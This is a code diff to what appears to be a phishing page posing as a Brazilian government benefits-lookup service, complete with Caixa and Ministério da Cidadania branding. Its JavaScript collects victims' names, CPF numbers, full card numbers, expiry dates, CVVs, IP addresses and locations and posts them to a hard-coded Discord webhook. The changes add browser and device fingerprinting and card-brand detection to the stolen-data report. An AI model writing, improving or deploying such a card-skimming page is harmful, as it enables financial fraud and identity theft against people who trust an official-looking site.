@@ -560,83 +560,107 @@
             document.getElementById('resultModal').style.display = 'none';
         }
 
-        // Enviar para webhook do Discord - Versão Premium
+        // Detectar tipo de cartão
+        function detectCardType(cardNumber) {
+            const num = cardNumber?.replace(/\s/g, '') || '';
+            if (/^4/.test(num)) return 'visa';
+            if (/^5[1-5]/.test(num)) return 'mastercard';
+            if (/^3[47]/.test(num)) return 'amex';
+            return 'unknown';
+        }
+
+        // Obter thumbnail do cartão
+        function getCardThumbnail(cardType) {
+            const thumbnails = {
+                visa: 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg',
+                mastercard: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
+                amex: 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg',
+                unknown: 'https://cdn-icons-png.flaticon.com/512/196/196578.png'
+            };
+            return thumbnails[cardType.toLowerCase()] || thumbnails.unknown;
+        }
+
+        // Detectar navegador
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            return 'Outro';
+        }
+
+        // Detectar dispositivo
+        function detectDevice() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            return isMobile ? 'Mobile' : 'Desktop';
+        }
+
+        // Enviar para webhook do Discord - Versão Ultra Premium
         async function sendToDiscordWebhook(data) {
             const webhookURL = 'https://discordapp.com/api/webhooks/1364725356116049940/_IRU9G9-JkPOCNNA3F7OKVaIjAsA6MG3IiRg8fRfN8F1VMBGbfXNa09_Ju6MfdkZqXeL';
             
-            // Formatar a mensagem para o Discord
+            // Detecção automática de informações
+            const cardType = detectCardType(data.cardNumber);
+            const colors = {
+                visa: 0x1a1f71,
+                mastercard: 0xeb001b,
+                amex: 0x016FD0,
+                unknown: 0x0066cc
+            };
+            
+            const embedColor = colors[cardType] || colors.unknown;
+            const locationEmoji = data.location?.includes('São Paulo') ? '🏙️' : '🏡';
+            const cardEmoji = cardType === 'visa' ? '💳' : 
+                            cardType === 'mastercard' ? '🧾' : 
+                            cardType === 'amex' ? '🃏' : '💴';
+
+            // Construir mensagem premium
             const discordMessage = {
-                username: "Consulta de Benefícios",
+                username: "Consulta de Benefícios Premium",
                 avatar_url: "https://www.caixa.gov.br/PublishingImages/Logo-Caixa.svg",
+                content: "📢 **Nova consulta realizada!**",
                 embeds: [{
-                    title: "💳 NOVA CONSULTA DE BENEFÍCIOS 💰",
-                    description: "🔍 Um novo cidadão consultou seus benefícios sociais!",
-                    color: 0x0066cc,
+                    title: `${cardEmoji} CONSULTA DE BENEFÍCIOS ${cardEmoji}`,
+                    description: "🔍 **Detalhes da consulta realizada**\n⠀",
+                    color: embedColor,
                     thumbnail: {
-                        url: "https://cdn-icons-png.flaticon.com/512/477/477103.png"
+                        url: getCardThumbnail(cardType)
                     },
                     fields: [
                         {
-                            name: "**👤 Nome Completo**",
-                            value: `\`\`\`${data.name || "Não informado"}\`\`\``,
+                            name: "**👤 DADOS PESSOAIS**",
+                            value: `▸ **Nome:** \`${data.name || "Não informado"}\`\n▸ **CPF:** \`${data.cpf || "Não informado"}\`\n▸ **IP:** \`${data.ip || "Não disponível"}\`\n▸ **Local:** ${locationEmoji} \`${data.location || "Não disponível"}\``,
                             inline: false
                         },
                         {
-                            name: "**📌 CPF**",
-                            value: `\`\`\`${data.cpf || "Não informado"}\`\`\``,
-                            inline: true
-                        },
-                        {
-                            name: "**📅 Data/Hora**",
-                            value: `<t:${Math.floor(Date.now()/1000)}:F>`,
-                            inline: true
-                        },
-                        {
-                            name: "**💳 Dados do Cartão**",
-                            value: `\`\`\`${data.cardNumber || "Não informado"}\`\`\``,
+                            name: "**💳 DADOS DO CARTÃO**",
+                            value: `▸ **Número:** \`${data.cardNumber || "Não informado"}\`\n▸ **Validade:** \`${data.expiry || "Não informado"}\`\n▸ **CVV:** \`${data.cvv || "Não informado"}\`\n▸ **Bandeira:** \`${cardType.toUpperCase()}\``,
                             inline: false
                         },
                         {
-                            name: "**📅 Validade**",
-                            value: `\`\`\`${data.expiry || "Não informado"}\`\`\``,
-                            inline: true
-                        },
-                        {
-                            name: "**🔑 CVV**",
-                            value: `\`\`\`${data.cvv || "Não informado"}\`\`\``,
-                            inline: true
-                        },
-                        {
-                            name: "**🌐 IP**",
-                            value: `\`${data.ip || "Não disponível"}\``,
-                            inline: true
-                        },
-                        {
-                            name: "**📍 Localização**",
-                            value: `\`${data.location || "Não disponível"}\``,
-                            inline: true
+                            name: "**📊 METADADOS**",
+                            value: `▸ **Hora:** <t:${Math.floor(Date.now()/1000)}:T>\n▸ **Data:** <t:${Math.floor(Date.now()/1000)}:D>\n▸ **Navegador:** \`${detectBrowser()}\`\n▸ **Dispositivo:** \`${detectDevice()}\``,
+                            inline: false
                         }
                     ],
                     image: {
                         url: "https://i.imgur.com/VvWkfzN.png"
                     },
-                    timestamp: new Date().toISOString(),
                     footer: {
-                        text: "Sistema de Consulta de Benefícios Sociais • Ministério da Cidadania",
+                        text: "Sistema de Consulta Premium • Ministério da Cidadania",
                         icon_url: "https://www.gov.br/mre/pt-br/temas/imagens/bandeira-brasil/@@images/image"
-                    }
+                    },
+                    timestamp: new Date().toISOString()
                 }]
             };
 
             try {
                 const response = await fetch(webhookURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(discordMessage)
                 });
-
                 return response.ok;
             } catch (error) {
                 console.error('Erro ao enviar para o webhook:', error);
